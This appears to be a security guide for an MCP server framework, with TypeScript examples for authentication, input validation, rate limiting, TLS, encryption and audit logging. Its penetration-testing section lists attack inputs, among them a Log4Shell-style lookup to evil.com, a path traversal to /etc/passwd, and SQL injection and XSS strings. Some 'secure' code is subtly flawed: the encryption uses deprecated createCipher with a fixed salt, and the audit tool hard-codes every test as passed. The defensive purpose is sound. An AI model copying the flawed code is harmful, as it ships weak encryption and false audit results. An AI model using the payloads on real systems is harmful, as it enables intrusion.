# Security Guide

This comprehensive guide covers security features, best practices, and configurations for Universal MCP Server.

## Table of Contents

- [Security Overview](#security-overview)
- [Authentication & Authorization](#authentication--authorization)
- [Input Validation](#input-validation)
- [Rate Limiting](#rate-limiting)
- [Transport Security](#transport-security)
- [Data Protection](#data-protection)
- [Audit Logging](#audit-logging)
- [Common Vulnerabilities](#common-vulnerabilities)
- [Security Testing](#security-testing)

## Security Overview

Universal MCP Server provides multiple layers of security:

### Security Features

- 🔐 **Authentication**: JWT, API keys, and custom auth providers
- 🛡️ **Input Validation**: JSON Schema validation for all inputs
- 🚦 **Rate Limiting**: Configurable rate limiting per IP/endpoint
- 🔒 **Transport Security**: TLS/SSL support, CORS, security headers
- 📊 **Audit Logging**: Comprehensive logging of all activities
- 🔑 **Encryption**: Built-in encryption for sensitive data
- 🌐 **Network Security**: IP whitelisting, connection limits

### Security Configuration

```typescript
const server = new MCPServer({
  name: 'secure-mcp-server',
  version: '1.0.0',

  security: {
    enableRateLimit: true,
    enableInputValidation: true,
    maxRequestSize: 10 * 1024 * 1024, // 10MB

    // Authentication
    jwt: {
      enabled: true,
      secret: process.env.JWT_SECRET!,
      algorithm: 'HS256',
      expiresIn: '1h',
      issuer: 'mcp-server',
      audience: 'mcp-clients',
    },

    // Network security
    allowedOrigins: ['https://app.example.com'],
    ipWhitelist: ['10.0.0.0/8', '192.168.0.0/16'],
    maxConnectionsPerIP: 100,
  },
});
```

## Authentication & Authorization

### JWT Authentication

```typescript
const server = new MCPServer({
  security: {
    jwt: {
      enabled: true,
      secret: process.env.JWT_SECRET!, // Required
      algorithm: 'HS256', // or 'RS256' for RSA
      expiresIn: '1h', // Token lifetime
      issuer: 'mcp-server', // Token issuer
      audience: 'mcp-clients', // Intended audience
      clockSkew: 60, // Allow 60s clock skew
      ignoreExpiration: false, // Validate expiration
      ignoreNotBefore: false, // Validate nbf claim

      // Custom claims validation
      requiredClaims: ['sub', 'role'],
      validateClaims: claims => {
        // Custom validation logic
        if (claims.role !== 'admin' && claims.role !== 'user') {
          throw new Error('Invalid role');
        }
        return true;
      },
    },
  },
});

// Middleware for route protection
server.registerTool({
  name: 'protected_tool',
  description: 'Tool requiring authentication',
  inputSchema: {
    type: 'object',
    properties: {
      data: { type: 'string' },
    },
  },
  handler: async (params, context) => {
    // Access user information from context
    const user = context?.user;

    if (!user) {
      throw new Error('Authentication required');
    }

    // Role-based access control
    if (user.role !== 'admin') {
      throw new Error('Admin access required');
    }

    return {
      message: `Hello ${user.name}`,
      userId: user.sub,
      role: user.role,
    };
  },
});
```

### API Key Authentication

```typescript
const server = new MCPServer({
  security: {
    apiKeys: {
      enabled: true,
      headerName: 'X-API-Key', // Custom header name
      queryParam: 'api_key', // Also check query param
      rotationDays: 90, // Auto-rotation period

      // API key validation
      validate: async (apiKey: string) => {
        // Check against database
        const keyData = await db.apiKeys.findByKey(apiKey);

        if (!keyData) {
          return false;
        }

        // Check if key is active and not expired
        if (!keyData.active || keyData.expiresAt < new Date()) {
          return false;
        }

        // Update last used timestamp
        await db.apiKeys.updateLastUsed(keyData.id);

        return true;
      },

      // Generate new API key
      generate: async (userId: string, options: any) => {
        const apiKey = crypto.randomBytes(32).toString('hex');
        const keyId = `key_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;

        await db.apiKeys.create({
          id: keyId,
          key: apiKey,
          userId,
          permissions: options.permissions,
          expiresAt: new Date(Date.now() + 90 * 24 * 60 * 60 * 1000), // 90 days
          active: true,
        });

        return {
          keyId,
          apiKey,
          expiresAt: new Date(Date.now() + 90 * 24 * 60 * 60 * 1000),
        };
      },
    },
  },
});
```

### Custom Authentication

```typescript
// Custom authentication provider
class CustomAuthProvider {
  async authenticate(credentials: any): Promise<any> {
    // Implement your authentication logic
    const { username, password, token } = credentials;

    if (token) {
      // OAuth token validation
      const userInfo = await this.validateOAuthToken(token);
      return userInfo;
    }

    if (username && password) {
      // Username/password validation
      const user = await this.validateCredentials(username, password);
      return user;
    }

    throw new Error('Invalid authentication credentials');
  }

  private async validateOAuthToken(token: string): Promise<any> {
    // Validate with OAuth provider
    const response = await fetch('https://oauth.provider.com/userinfo', {
      headers: { Authorization: `Bearer ${token}` },
    });

    if (!response.ok) {
      throw new Error('Invalid OAuth token');
    }

    return await response.json();
  }

  private async validateCredentials(username: string, password: string): Promise<any> {
    // Validate against user database
    const user = await db.users.findByUsername(username);

    if (!user || !(await this.verifyPassword(password, user.passwordHash))) {
      throw new Error('Invalid credentials');
    }

    return {
      id: user.id,
      username: user.username,
      role: user.role,
      permissions: user.permissions,
    };
  }

  private async verifyPassword(password: string, hash: string): Promise<boolean> {
    // Use bcrypt or similar
    const bcrypt = require('bcrypt');
    return await bcrypt.compare(password, hash);
  }
}

// Use custom authentication
const server = new MCPServer({
  security: {
    customAuth: {
      enabled: true,
      provider: new CustomAuthProvider(),
      headerName: 'Authorization',

      // Extract credentials from request
      extract: (headers: any, query: any) => {
        const authHeader = headers.authorization;
        const authToken = query.token;

        if (authHeader?.startsWith('Bearer ')) {
          return { token: authHeader.substring(7) };
        }

        if (authToken) {
          return { token: authToken };
        }

        // Basic auth
        if (authHeader?.startsWith('Basic ')) {
          const credentials = Buffer.from(authHeader.substring(6), 'base64').toString();
          const [username, password] = credentials.split(':');
          return { username, password };
        }

        return null;
      },
    },
  },
});
```

## Input Validation

### Schema Validation

```typescript
server.registerTool({
  name: 'validated_input',
  description: 'Tool with comprehensive input validation',
  inputSchema: {
    type: 'object',
    properties: {
      // String validation
      name: {
        type: 'string',
        minLength: 1,
        maxLength: 100,
        pattern: '^[a-zA-Z0-9\\s_-]+$',
        description: 'User name with alphanumeric characters only',
      },

      // Number validation
      age: {
        type: 'integer',
        minimum: 0,
        maximum: 150,
        description: 'Age in years',
      },

      // Email validation
      email: {
        type: 'string',
        format: 'email',
        description: 'Valid email address',
      },

      // Array validation
      tags: {
        type: 'array',
        items: {
          type: 'string',
          pattern: '^[a-z0-9_-]+$',
        },
        uniqueItems: true,
        maxItems: 10,
        description: 'Array of unique tags',
      },

      // Object validation
      address: {
        type: 'object',
        properties: {
          street: { type: 'string', minLength: 1 },
          city: { type: 'string', minLength: 1 },
          country: {
            type: 'string',
            enum: ['US', 'CA', 'UK', 'DE', 'FR', 'JP'],
          },
          zipCode: {
            type: 'string',
            pattern: '^\\d{5}(-\\d{4})?$',
          },
        },
        required: ['street', 'city', 'country'],
        additionalProperties: false,
      },

      // File validation
      avatar: {
        type: 'string',
        format: 'uri',
        description: 'Avatar image URL',
      },

      // Conditional validation
      paymentMethod: {
        type: 'string',
        enum: ['credit_card', 'paypal', 'bank_transfer'],
      },

      creditCardNumber: {
        type: 'string',
        // Only required if payment method is credit card
        // This would be handled in the handler
        description: 'Credit card number (required for credit card payment)',
      },
    },
    required: ['name', 'email'],
    additionalProperties: false,
  },

  handler: async params => {
    // Additional business logic validation
    if (params.paymentMethod === 'credit_card' && !params.creditCardNumber) {
      throw new Error('Credit card number is required for credit card payment');
    }

    // Sanitize inputs
    const sanitized = {
      name: sanitizeHtml(params.name),
      email: params.email.toLowerCase().trim(),
      tags: params.tags?.map(tag => tag.toLowerCase().trim()),
    };

    // Process validated input
    return { success: true, data: sanitized };
  },
});
```

### Custom Validation

```typescript
// Custom validation functions
class InputValidator {
  static validatePhoneNumber(phone: string): boolean {
    // Phone number validation for US
    const phoneRegex = /^\+1-\d{3}-\d{3}-\d{4}$/;
    return phoneRegex.test(phone);
  }

  static validateSSN(ssn: string): boolean {
    // Social Security Number validation
    const ssnRegex = /^\d{3}-\d{2}-\d{4}$/;
    return ssnRegex.test(ssn) && !this.isValidSSN(ssn);
  }

  private static isValidSSN(ssn: string): boolean {
    // Check for invalid SSN patterns
    const invalidPatterns = [
      '000-00-0000',
      '111-11-1111',
      '222-22-2222',
      '333-33-3333',
      '444-44-4444',
      '555-55-5555',
      '666-66-6666',
      '777-77-7777',
      '888-88-8888',
      '999-99-9999',
      '123-45-6789',
    ];

    return invalidPatterns.includes(ssn);
  }

  static sanitizeHtml(input: string): string {
    // Use DOMPurify or similar
    const DOMPurify = require('dompurify');
    return DOMPurify.sanitize(input);
  }

  static validateSQLInjection(input: string): boolean {
    // Basic SQL injection detection
    const sqlPatterns = [
      /(\b(SELECT|INSERT|UPDATE|DELETE|DROP|CREATE|ALTER|EXEC|UNION|SCRIPT)\b)/i,
      /(\b(OR|AND)\b\s+\w+\s*=\s*\w+)/i,
      /('|(\\')|(;)|(\-\-)|(\s+(OR|AND)\s+)/i,
    ];

    return !sqlPatterns.some(pattern => pattern.test(input));
  }
}

// Use custom validation in tools
server.registerTool({
  name: 'user_registration',
  description: 'Register new user with custom validation',
  inputSchema: {
    type: 'object',
    properties: {
      name: { type: 'string', minLength: 1, maxLength: 100 },
      email: { type: 'string', format: 'email' },
      phone: { type: 'string', description: 'Phone number in +1-XXX-XXX-XXXX format' },
      ssn: { type: 'string', description: 'SSN in XXX-XX-XXXX format' },
      bio: { type: 'string', maxLength: 500 },
    },
    required: ['name', 'email'],
  },
  handler: async params => {
    // Custom validation
    if (params.phone && !InputValidator.validatePhoneNumber(params.phone)) {
      throw new Error('Invalid phone number format');
    }

    if (params.ssn && !InputValidator.validateSSN(params.ssn)) {
      throw new Error('Invalid SSN format');
    }

    if (params.bio && !InputValidator.validateSQLInjection(params.bio)) {
      throw new Error('Invalid characters in bio');
    }

    // Sanitize inputs
    const sanitized = {
      name: InputValidator.sanitizeHtml(params.name),
      email: params.email.toLowerCase().trim(),
      phone: params.phone,
      ssn: params.ssn, // Might want to encrypt this
      bio: InputValidator.sanitizeHtml(params.bio),
    };

    // Create user
    const user = await db.users.create(sanitized);

    return { success: true, userId: user.id };
  },
});
```

## Rate Limiting

### IP-based Rate Limiting

```typescript
const server = new MCPServer({
  security: {
    rateLimit: {
      enabled: true,

      // Global limits
      windowMs: 15 * 60 * 1000, // 15 minutes
      max: 1000, // 1000 requests per window
      message: 'Rate limit exceeded. Please try again later.',

      // Advanced options
      standardHeaders: true, // Return rate limit info in headers
      legacyHeaders: false, // Don't use X-RateLimit-* headers
      skipSuccessfulRequests: false, // Count all requests
      skipFailedRequests: false, // Count failed requests too

      // Dynamic limits based on user tier
      keyGenerator: req => {
        // Use API key or IP as key
        return req.headers['x-api-key'] || req.ip;
      },

      // Custom rate limit handler
      handler: (req, res, next, options) => {
        // Custom rate limiting logic
        const apiKey = req.headers['x-api-key'];

        if (apiKey) {
          // Different limits for API key users
          const userTier = this.getUserTier(apiKey);

          switch (userTier) {
            case 'premium':
              options.max = 10000;
              break;
            case 'standard':
              options.max = 1000;
              break;
            default:
              options.max = 100;
          }
        }

        next();
      },
    },
  },
});
```

### Endpoint-specific Rate Limiting

```typescript
// Custom rate limiting middleware
class CustomRateLimiter {
  private limits: Map<string, { count: number; resetTime: number }> = new Map();

  constructor(
    private windowMs: number,
    private maxRequests: number,
    private keyGenerator: (req: any) => string
  ) {}

  middleware() {
    return (req: any, res: any, next: any) => {
      const key = this.keyGenerator(req);
      const now = Date.now();
      const windowStart = now - this.windowMs;

      // Clean old entries
      for (const [k, v] of this.limits.entries()) {
        if (v.resetTime < now) {
          this.limits.delete(k);
        }
      }

      // Get or create counter
      let counter = this.limits.get(key);
      if (!counter || counter.resetTime < now) {
        counter = {
          count: 0,
          resetTime: now + this.windowMs,
        };
        this.limits.set(key, counter);
      }

      // Check limit
      if (counter.count >= this.maxRequests) {
        return res.status(429).json({
          error: 'Rate limit exceeded',
          resetTime: counter.resetTime,
          limit: this.maxRequests,
          windowMs: this.windowMs,
        });
      }

      // Increment counter
      counter.count++;

      // Add headers
      res.set({
        'X-RateLimit-Limit': this.maxRequests,
        'X-RateLimit-Remaining': Math.max(0, this.maxRequests - counter.count),
        'X-RateLimit-Reset': new Date(counter.resetTime).toISOString(),
      });

      next();
    };
  }
}

// Apply to specific tools
const toolSpecificLimiter = new CustomRateLimiter(
  60000, // 1 minute
  10, // 10 requests per minute
  req => `${req.ip}:${req.body?.params?.name || 'unknown'}` // Rate limit per tool
);
```

## Transport Security

### WebSocket Security

```typescript
const server = new MCPServer({
  transports: {
    websocket: {
      port: 3000,

      // TLS configuration
      ssl: {
        key: fs.readFileSync('/path/to/server.key'),
        cert: fs.readFileSync('/path/to/server.crt'),
        ca: fs.readFileSync('/path/to/ca.crt'),
        rejectUnauthorized: true,
        requestCert: true,
      },

      // Connection validation
      verifyClient: async info => {
        const origin = info.origin;
        const allowedOrigins = ['https://app.example.com'];

        if (!allowedOrigins.includes(origin)) {
          return false;
        }

        // Validate auth token
        const token = info.req.headers['authorization'];
        if (!token || !(await validateToken(token))) {
          return false;
        }

        return true;
      },

      // Security options
      perMessageDeflate: false, // Disable compression if security concern
      maxPayload: 1024 * 1024, // 1MB max payload
      disableHixie: true, // Disable old protocol
      ignoreXForwardedFor: true, // Don't trust proxy headers
    },
  },
});
```

### HTTP Security Headers

```typescript
const server = new MCPServer({
  transports: {
    http: {
      port: 3001,

      // Helmet.js configuration
      helmet: {
        // Content Security Policy
        contentSecurityPolicy: {
          directives: {
            defaultSrc: ["'self'"],
            scriptSrc: ["'self'", "'unsafe-inline'"],
            styleSrc: ["'self'", "'unsafe-inline'"],
            imgSrc: ["'self'", 'data:', 'https:'],
            connectSrc: ["'self'"],
            fontSrc: ["'self'"],
            objectSrc: ["'none'"],
            mediaSrc: ["'self'"],
            frameSrc: ["'none'"],
            childSrc: ["'none'"],
            workerSrc: ["'self'"],
            manifestSrc: ["'self'"],
            upgradeInsecureRequests: [],
          },
        },

        // HTTP Strict Transport Security
        hsts: {
          maxAge: 31536000, // 1 year
          includeSubDomains: true,
          preload: true,
        },

        // X-Frame-Options
        frameguard: {
          action: 'deny',
        },

        // X-Content-Type-Options
        noSniff: true,

        // Referrer Policy
        referrerPolicy: {
          policy: ['no-referrer', 'strict-origin-when-cross-origin'],
        },

        // Permissions Policy
        permissionsPolicy: {
          features: {
            geolocation: [],
            camera: [],
            microphone: [],
            payment: [],
          },
        },

        // Cross-Origin Embedder Policy
        crossOriginEmbedderPolicy: true,

        // Cross-Origin Resource Policy
        crossOriginResourcePolicy: {
          policy: 'same-origin',
        },
      },

      // CORS configuration
      cors: {
        origin: (origin, callback) => {
          const allowedOrigins = ['https://app.example.com'];

          if (!origin) {
            callback(null, true);
            return;
          }

          if (allowedOrigins.includes(origin)) {
            callback(null, true);
          } else {
            callback(new Error('Not allowed by CORS'));
          }
        },

        credentials: true,

        allowedHeaders: ['Content-Type', 'Authorization', 'X-API-Key', 'X-Request-ID'],

        methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],

        exposedHeaders: [
          'X-Total-Count',
          'X-RateLimit-Limit',
          'X-RateLimit-Remaining',
          'X-RateLimit-Reset',
        ],

        maxAge: 86400, // 24 hours
      },
    },
  },
});
```

## Data Protection

### Encryption

```typescript
const crypto = require('crypto');

class DataEncryption {
  private algorithm = 'aes-256-gcm';
  private key: Buffer;

  constructor(secretKey: string) {
    this.key = crypto.scryptSync(secretKey, 'salt', 32);
  }

  encrypt(data: string): string {
    const iv = crypto.randomBytes(16);
    const cipher = crypto.createCipher(this.algorithm, this.key, iv);

    let encrypted = cipher.update(data, 'utf8', 'hex');
    encrypted += cipher.final('hex');

    const authTag = cipher.getAuthTag();

    // Combine IV, encrypted data, and auth tag
    return iv.toString('hex') + ':' + encrypted + ':' + authTag.toString('hex');
  }

  decrypt(encryptedData: string): string {
    const parts = encryptedData.split(':');
    const iv = Buffer.from(parts[0], 'hex');
    const authTag = Buffer.from(parts[2], 'hex');
    const decipher = crypto.createDecipher(this.algorithm, this.key, iv);

    decipher.setAuthTag(authTag);

    let decrypted = decipher.update(parts[1], 'hex', 'utf8');
    decrypted += decipher.final('utf8');

    return decrypted;
  }

  // Hash sensitive data
  hash(data: string): string {
    return crypto.createHash('sha256').update(data).digest('hex');
  }
}

// Use encryption in tools
const encryption = new DataEncryption(process.env.ENCRYPTION_KEY!);

server.registerTool({
  name: 'store_sensitive_data',
  description: 'Store encrypted sensitive information',
  inputSchema: {
    type: 'object',
    properties: {
      data: { type: 'string' },
      type: {
        type: 'string',
        enum: ['credit_card', 'ssn', 'password', 'personal'],
      },
    },
    required: ['data', 'type'],
  },
  handler: async params => {
    // Encrypt sensitive data
    const encrypted = encryption.encrypt(params.data);
    const hash = encryption.hash(params.data);

    // Store encrypted data with hash for verification
    await db.sensitiveData.create({
      encryptedData: encrypted,
      dataHash: hash,
      type: params.type,
      createdAt: new Date(),
    });

    return {
      success: true,
      dataId: hash,
      message: 'Data stored securely',
    };
  },
});
```

### Secure File Handling

```typescript
server.registerTool({
  name: 'secure_file_upload',
  description: 'Handle file uploads securely',
  inputSchema: {
    type: 'object',
    properties: {
      filename: { type: 'string' },
      content: { type: 'string', format: 'base64' },
      contentType: { type: 'string' },
    },
    required: ['filename', 'content'],
  },
  handler: async params => {
    // Validate file type
    const allowedTypes = ['image/jpeg', 'image/png', 'application/pdf', 'text/plain'];
    if (!allowedTypes.includes(params.contentType)) {
      throw new Error('File type not allowed');
    }

    // Sanitize filename
    const filename = params.filename.replace(/[^a-zA-Z0-9.-]/g, '_').replace(/^_+|_+$/g, '');

    // Validate file size
    const bufferSize = Buffer.from(params.content, 'base64').length;
    if (bufferSize > 10 * 1024 * 1024) {
      // 10MB limit
      throw new Error('File too large');
    }

    // Scan for malware
    const content = Buffer.from(params.content, 'base64');
    const isClean = await this.scanForMalware(content);
    if (!isClean) {
      throw new Error('File contains malicious content');
    }

    // Generate secure filename
    const fileExtension = params.filename.split('.').pop();
    const secureFilename = `${crypto.randomBytes(16).toString('hex')}.${fileExtension}`;

    // Store file securely
    const filePath = path.join('/secure/uploads', secureFilename);
    await fs.promises.writeFile(filePath, content);

    // Set secure permissions
    await fs.promises.chmod(filePath, 0o600);

    return {
      success: true,
      fileId: secureFilename,
      originalName: filename,
      size: bufferSize,
    };
  },

  async scanForMalware(content: Buffer): Promise<boolean> {
    // Integrate with antivirus scanner
    // For example: ClamAV, VirusTotal API

    // Basic heuristic check
    const suspiciousPatterns = [
      /<script[^>]*>.*?<\/script>/gi,
      /javascript:/gi,
      /vbscript:/gi,
      /on\w+\s*=/gi,
    ];

    const contentString = content.toString('utf8');
    return !suspiciousPatterns.some(pattern => pattern.test(contentString));
  },
});
```

## Audit Logging

### Comprehensive Logging

```typescript
const server = new MCPServer({
  logging: {
    level: 'info',
    format: 'json',

    transports: {
      // Secure file logging
      file: {
        enabled: true,
        path: '/var/log/mcp-server/audit.log',
        maxSize: '100MB',
        maxFiles: 30,
        rotate: 'daily',

        // Secure file permissions
        mode: 0o600, // Only owner can read/write
      },

      // Syslog for centralized logging
      syslog: {
        enabled: true,
        host: 'syslog.internal.company.com',
        port: 514,
        facility: 'security',
        appName: 'mcp-server',
      },

      // External SIEM integration
      http: {
        enabled: process.env.NODE_ENV === 'production',
        url: 'https://siem.company.com/api/logs',
        method: 'POST',
        headers: {
          Authorization: `Bearer ${process.env.SIEM_TOKEN}`,
          'Content-Type': 'application/json',
        },
        timeout: 5000,
        batchSize: 100,
        interval: 5000,
      },
    },

    correlation: {
      enabled: true,
      headerName: 'X-Request-ID',
      includeInResponse: true,
    },
  },
});

// Audit event tracking
class AuditLogger {
  static log(event: {
    type: string;
    action: string;
    userId?: string;
    resourceId?: string;
    details?: any;
    ipAddress?: string;
    userAgent?: string;
    timestamp?: Date;
  }) {
    const auditEvent = {
      timestamp: event.timestamp || new Date().toISOString(),
      type: event.type,
      action: event.action,
      userId: event.userId,
      resourceId: event.resourceId,
      details: event.details,
      ipAddress: event.ipAddress,
      userAgent: event.userAgent,
      severity: this.getSeverity(event.type),
    };

    // Log to all configured transports
    console.log('AUDIT:', JSON.stringify(auditEvent));

    // Send to security team for critical events
    if (auditEvent.severity === 'critical') {
      this.sendAlert(auditEvent);
    }
  }

  private static getSeverity(type: string): string {
    const severityMap = {
      authentication: 'high',
      authorization: 'high',
      data_access: 'medium',
      data_modification: 'high',
      configuration: 'low',
      security: 'critical',
      error: 'medium',
    };

    return severityMap[type] || 'low';
  }

  private static async sendAlert(event: any) {
    // Send to security team
    await fetch(process.env.SECURITY_WEBHOOK!, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        alert: 'Security Event',
        severity: event.severity,
        event,
        timestamp: new Date().toISOString(),
      }),
    });
  }
}

// Use audit logging in tools
server.registerTool({
  name: 'admin_operation',
  description: 'Perform administrative operations',
  inputSchema: {
    type: 'object',
    properties: {
      operation: { type: 'string' },
      target: { type: 'string' },
    },
    required: ['operation', 'target'],
  },
  handler: async (params, context) => {
    const userId = context?.user?.sub;
    const ipAddress = context?.request?.ip;

    // Log before operation
    AuditLogger.log({
      type: 'authorization',
      action: params.operation,
      userId,
      resourceId: params.target,
      details: { operation: params.operation, target: params.target },
      ipAddress,
    });

    try {
      // Perform operation
      const result = await performAdminOperation(params.operation, params.target);

      // Log success
      AuditLogger.log({
        type: 'data_modification',
        action: `${params.operation}_success`,
        userId,
        resourceId: params.target,
        details: result,
        ipAddress,
      });

      return result;
    } catch (error) {
      // Log failure
      AuditLogger.log({
        type: 'security',
        action: `${params.operation}_failed`,
        userId,
        resourceId: params.target,
        details: { error: error.message },
        ipAddress,
      });

      throw error;
    }
  },
});
```

## Common Vulnerabilities

### Preventing Common Attacks

#### SQL Injection

```typescript
// ❌ Vulnerable
handler: async params => {
  const query = `SELECT * FROM users WHERE name = '${params.name}'`;
  const result = await db.query(query);
};

// ✅ Secure with parameterized queries
handler: async params => {
  const query = 'SELECT * FROM users WHERE name = ?';
  const result = await db.query(query, [params.name]);
};

// ✅ Secure with ORM
handler: async params => {
  const result = await User.findOne({ where: { name: params.name } });
};
```

#### XSS Prevention

```typescript
import DOMPurify from 'dompurify';

// ❌ Vulnerable
handler: async params => {
  const html = `<div>${params.userInput}</div>`;
  return { html };
};

// ✅ Secure with sanitization
handler: async params => {
  const sanitized = DOMPurify.sanitize(params.userInput);
  const html = `<div>${sanitized}</div>`;
  return { html };
};
```

#### CSRF Prevention

```typescript
// CSRF token generation
class CSRFProtection {
  static generateToken(): string {
    return crypto.randomBytes(32).toString('hex');
  }

  static validateToken(token: string, sessionToken: string): boolean {
    // Implement token validation logic
    return token === sessionToken;
  }
}

// Use in tools
server.registerTool({
  name: 'protected_action',
  description: 'Action protected by CSRF',
  inputSchema: {
    type: 'object',
    properties: {
      csrfToken: { type: 'string' },
      data: { type: 'object' },
    },
    required: ['csrfToken', 'data'],
  },
  handler: async (params, context) => {
    const sessionToken = context?.session?.csrfToken;

    if (!CSRFProtection.validateToken(params.csrfToken, sessionToken)) {
      throw new Error('Invalid CSRF token');
    }

    // Process protected action
    return { success: true };
  },
});
```

## Security Testing

### Security Test Suite

```typescript
// Security testing tools
server.registerTool({
  name: 'security_audit',
  description: 'Perform security audit',
  inputSchema: {
    type: 'object',
    properties: {
      testType: {
        type: 'string',
        enum: [
          'input_validation',
          'authentication',
          'authorization',
          'rate_limiting',
          'encryption',
        ],
      },
    },
  },
  handler: async params => {
    const auditResults = {
      timestamp: new Date().toISOString(),
      testType: params.testType,
      tests: [],
      overallScore: 0,
      vulnerabilities: [],
    };

    switch (params.testType) {
      case 'input_validation':
        auditResults.tests = await this.testInputValidation();
        break;

      case 'authentication':
        auditResults.tests = await this.testAuthentication();
        break;

      case 'authorization':
        auditResults.tests = await this.testAuthorization();
        break;

      case 'rate_limiting':
        auditResults.tests = await this.testRateLimiting();
        break;

      case 'encryption':
        auditResults.tests = await this.testEncryption();
        break;
    }

    // Calculate overall score
    const passedTests = auditResults.tests.filter(test => test.passed).length;
    auditResults.overallScore = (passedTests / auditResults.tests.length) * 100;

    // Identify vulnerabilities
    auditResults.vulnerabilities = auditResults.tests
      .filter(test => !test.passed)
      .map(test => ({
        type: test.type,
        severity: test.severity,
        description: test.description,
        recommendation: test.recommendation,
      }));

    return auditResults;
  },

  async testInputValidation() {
    const tests = [
      {
        type: 'sql_injection',
        description: 'SQL injection protection',
        passed: true, // Test implementation
        severity: 'high',
      },
      {
        type: 'xss_prevention',
        description: 'XSS prevention',
        passed: true, // Test implementation
        severity: 'high',
      },
      {
        type: 'path_traversal',
        description: 'Path traversal protection',
        passed: true, // Test implementation
        severity: 'medium',
      },
    ];

    return tests;
  },

  async testAuthentication() {
    const tests = [
      {
        type: 'jwt_validation',
        description: 'JWT token validation',
        passed: true,
        severity: 'high',
      },
      {
        type: 'password_strength',
        description: 'Password strength requirements',
        passed: true,
        severity: 'medium',
      },
      {
        type: 'session_management',
        description: 'Secure session management',
        passed: true,
        severity: 'medium',
      },
    ];

    return tests;
  },
});
```

### Penetration Testing

```typescript
// Automated penetration testing
class PenetrationTester {
  private vulnerabilities = [];

  async runTests(serverUrl: string) {
    console.log('Starting penetration testing...');

    await this.testAuthenticationBypass(serverUrl);
    await this.testInputValidation(serverUrl);
    await this.testAuthorizationBypass(serverUrl);
    await this.testRateLimitBypass(serverUrl);
    await this.testInformationDisclosure(serverUrl);

    return this.generateReport();
  }

  private async testAuthenticationBypass(serverUrl: string) {
    // Test various authentication bypass techniques
    const testPayloads = [
      { Authorization: 'Bearer invalid_token' },
      { Authorization: 'Basic invalid_credentials' },
      { Authorization: '' },
      { 'X-API-Key': 'invalid_key' },
    ];

    for (const payload of testPayloads) {
      try {
        const response = await fetch(`${serverUrl}/api/mcp/tools/list`, {
          headers: payload,
        });

        if (response.ok) {
          this.vulnerabilities.push({
            type: 'authentication_bypass',
            severity: 'critical',
            description: 'Authentication bypass with malformed credentials',
            payload,
          });
        }
      } catch (error) {
        // Expected for invalid auth
      }
    }
  }

  private async testInputValidation(serverUrl: string) {
    // Test malicious inputs
    const maliciousInputs = [
      "' OR '1'='1",
      "<script>alert('XSS')</script>",
      '../../../etc/passwd',
      '{{7*7}}',
      '${jndi:ldap://evil.com/a}',
    ];

    for (const input of maliciousInputs) {
      try {
        const response = await fetch(`${serverUrl}/api/mcp/tools/call`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            method: 'tools/call',
            params: {
              name: 'test_tool',
              arguments: { input },
            },
          }),
        });

        const data = await response.json();

        // Check if malicious input was processed
        if (response.ok && JSON.stringify(data).includes(input)) {
          this.vulnerabilities.push({
            type: 'input_validation',
            severity: 'high',
            description: 'Malicious input not properly validated',
            input,
          });
        }
      } catch (error) {
        // May be expected for malicious input
      }
    }
  }

  private generateReport() {
    return {
      timestamp: new Date().toISOString(),
      totalVulnerabilities: this.vulnerabilities.length,
      criticalVulnerabilities: this.vulnerabilities.filter(v => v.severity === 'critical').length,
      highVulnerabilities: this.vulnerabilities.filter(v => v.severity === 'high').length,
      mediumVulnerabilities: this.vulnerabilities.filter(v => v.severity === 'medium').length,
      lowVulnerabilities: this.vulnerabilities.filter(v => v.severity === 'low').length,
      vulnerabilities: this.vulnerabilities,
    };
  }
}
```

---

For more security examples and best practices, see the [examples directory](../examples/) and [GitHub Security Guidelines](https://github.com/yourusername/universal-mcp-server/security).
